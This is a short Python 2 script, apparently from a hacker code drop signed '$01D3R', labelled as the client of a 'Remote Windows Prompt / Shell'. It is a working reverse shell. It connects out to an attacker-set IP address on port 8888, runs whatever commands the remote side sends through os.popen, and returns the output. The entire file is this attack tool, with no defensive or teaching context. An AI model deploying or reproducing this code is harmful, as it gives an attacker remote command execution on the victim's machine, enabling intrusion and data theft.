####################################### Coded By $01D3R

#!/usr/bin/python

# Remote Windows Prompt / Shell
# CLIENT

import os
import sys
import socket
import time

Host = '127.0.0.1' # Enter ur IP ADRESS
Port = 8888
adrs = (Host, Port)
Buff = 64790
error = "Error Socket"

SockClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print "Connection....Waiting...\n"
    time.sleep(2)
    
    SockClient.connect(adrs)
    print "Connected !!!"
    
except socket.error:
    
    print error

while (1):

    data = SockClient.recv(Buff)

    if data == "cmd":

        Proc = SockClient.recv(Buff)

        try:

            if Proc == "close~cmd":
                SockClient.send("\n[*]Remote Windows Prompt Disconnected..\n")

            else :

                shell_exec = os.popen(Proc)
                SockClient.send(shell_exec.read())

        except:

            SockClient.send("[*]Error Remote Shell...")

SockClient.close()
